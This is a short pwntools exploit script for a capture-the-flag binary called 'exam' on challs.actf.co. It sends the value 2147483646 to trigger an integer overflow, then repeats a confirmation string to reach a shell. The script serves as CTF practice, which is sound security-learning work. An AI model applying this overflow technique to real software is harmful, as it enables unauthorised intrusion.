from pwn import *
from icecream import ic

elf = exe = ELF("./exam")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.actf.co", 31322)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+113
b *main+301
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# def increase():
#     ru(":")
#     sl(b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.")


# ru(":")
# sl(b'2147483646')

# for i in range(3):
#     increase()
sla(b'\n:',b'2147483646');
for i in range(3):
    sla(b'\n:',b'I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.')
# increase()
io.interactive()
